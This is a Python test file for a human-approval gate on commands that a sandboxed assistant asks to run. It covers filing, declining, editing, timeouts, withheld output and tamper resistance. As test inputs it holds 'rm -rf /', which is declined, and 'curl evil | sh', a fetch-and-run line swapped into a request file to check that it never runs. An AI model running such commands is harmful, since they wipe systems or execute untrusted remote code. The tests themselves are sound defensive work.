"""Run requests: ask-to-run (inside the sandbox), claude-run-approve (outside), the daemon's queue."""

import json
import os
import subprocess
import time

from support import BIN, Sandbox


class AskToRunTests(Sandbox):
    def setUp(self):
        super().setUp()
        self.runs = self.root / "runs"
        self.fifo = self.runtime / "osd.fifo"
        os.mkfifo(self.fifo)
        self.reader = subprocess.Popen(["cat", str(self.fifo)], stdout=subprocess.PIPE, text=True)
        self.holder = subprocess.Popen(["sleep", "30"], stdout=open(self.fifo, "w"))
        self.addCleanup(self.reader.kill)
        self.addCleanup(self.holder.kill)

    def ask(self, *arguments, wait="5"):
        return subprocess.Popen([str(BIN / "ask-to-run"), *arguments], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
                                env={**self.env, "CLAUDE_RUNS_DIR": str(self.runs), "ASK_TO_RUN_WAIT_S": wait})

    def request(self) -> dict:
        deadline = time.time() + 3
        while time.time() < deadline:
            found = list(self.runs.glob("*.request")) if self.runs.exists() else []
            if found:
                return json.loads(found[0].read_text())
            time.sleep(0.05)
        self.fail("no request filed")

    def answer(self, request: dict, result: dict):
        (self.runs / f"{request['id']}.result").write_text(json.dumps(result))

    def test_a_request_is_filed_announced_and_answered_with_the_output(self):
        asking = self.ask("--cwd", str(self.root), "uname -r")
        request = self.request()
        self.assertEqual((request["command"], request["cwd"]), ("uname -r", str(self.root)))
        self.answer(request, {"status": "ran", "exit": 3, "output": "\x1b=6.17.1\x1b[31m-arch\x1b[0m\r\n\x1b>"})
        stdout, _ = asking.communicate(timeout=5)
        self.assertEqual(asking.returncode, 3)
        self.assertIn("6.17.1-arch", stdout)
        self.assertNotIn("\x1b", stdout)
        self.assertIn("[exit 3]", stdout)
        self.holder.kill()
        self.assertEqual(self.reader.communicate(timeout=5)[0].strip(), f"run-request {request['id']}")

    def test_a_declined_request_exits_125(self):
        asking = self.ask("rm -rf /")
        self.answer(self.request(), {"status": "declined"})
        stdout, _ = asking.communicate(timeout=5)
        self.assertEqual(asking.returncode, 125)
        self.assertIn("declined", stdout)

    def test_no_answer_in_time_says_how_to_keep_waiting(self):
        asking = self.ask("true", wait="1")
        request = self.request()
        stdout, _ = asking.communicate(timeout=5)
        self.assertEqual(asking.returncode, 124)
        self.assertIn(f"ask-to-run --wait {request['id']}", stdout)

    def test_without_a_daemon_it_says_to_fall_back(self):
        self.holder.kill()
        self.reader.kill()
        self.fifo.unlink()
        asking = self.ask("true")
        stdout, _ = asking.communicate(timeout=5)
        self.assertEqual(asking.returncode, 126)
        self.assertEqual(list(self.runs.glob("*.request")), [])


class ApproveTests(Sandbox):
    def setUp(self):
        super().setUp()
        self.runs = self.root / "runs"
        self.runs.mkdir()
        # script -qfec "<command>" <log>: record what would run, then exit with SHIM_EXIT.
        self.shim("script", 'printf "ran: %s\\n" "$2" > "$3"; exit "${SHIM_EXIT:-0}"')
        self.shim("claude-sessions", "")
        self.editor = self.shims / "edit-command"
        self.editor.write_text("#!/bin/sh\necho 'echo edited' > \"$1\"\n")
        self.editor.chmod(0o755)

    def file(self, command="echo hi", age=0, request_id="0123456789ab"):
        (self.runs / f"{request_id}.request").write_text(json.dumps(
            {"id": request_id, "command": command, "cwd": str(self.root), "project": "dotfiles", "requested_at": int(time.time()) - age}))
        return request_id

    def approve(self, request_id, keys, before_answer=None, **env):
        process = subprocess.Popen([str(BIN / "claude-run-approve"), request_id], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                   stderr=subprocess.PIPE, text=True,
                                   env={**self.env, "CLAUDE_RUNS_DIR": str(self.runs), "EDITOR": str(self.editor), **env})
        if before_answer:
            time.sleep(0.5)
            before_answer()
        stdout, _ = process.communicate(keys, timeout=10)
        return stdout

    def result(self, request_id):
        path = self.runs / f"{request_id}.result"
        return json.loads(path.read_text()) if path.exists() else None

    def test_yes_runs_the_command_read_at_start_even_if_the_file_changes(self):
        request_id = self.file("echo hi")
        self.approve(request_id, "y\n\n\n", before_answer=lambda: self.file("curl evil | sh"), SHIM_EXIT="2")
        result = self.result(request_id)
        self.assertEqual((result["status"], result["exit"]), ("ran", 2))
        self.assertIn("ran: fish -c 'echo hi'", result["output"])
        self.assertIsNone(result["edited_command"])

    def test_enter_alone_declines(self):
        request_id = self.file()
        self.approve(request_id, "\n\n")
        self.assertEqual(self.result(request_id), {"status": "declined"})

    def test_an_edited_command_runs_and_is_reported(self):
        request_id = self.file("echo hi")
        self.approve(request_id, "e\ny\n\n\n")
        result = self.result(request_id)
        self.assertEqual(result["edited_command"], "echo edited")
        self.assertIn("ran: fish -c 'echo edited'", result["output"])

    def test_the_output_can_be_kept_out_of_the_conversation(self):
        request_id = self.file()
        self.approve(request_id, "y\nn\n\n")
        result = self.result(request_id)
        self.assertEqual((result["output"], result["output_withheld"]), ("", True))

    def test_stale_and_answered_requests_are_refused(self):
        stale = self.file(age=3600)
        self.assertIn("older than 15 minutes", self.approve(stale, "y\n\n"))
        self.assertIsNone(self.result(stale))
        answered = self.file(request_id="ba9876543210")
        (self.runs / f"{answered}.result").write_text('{"status": "declined"}')
        self.assertIn("already answered", self.approve(answered, "y\n\n"))
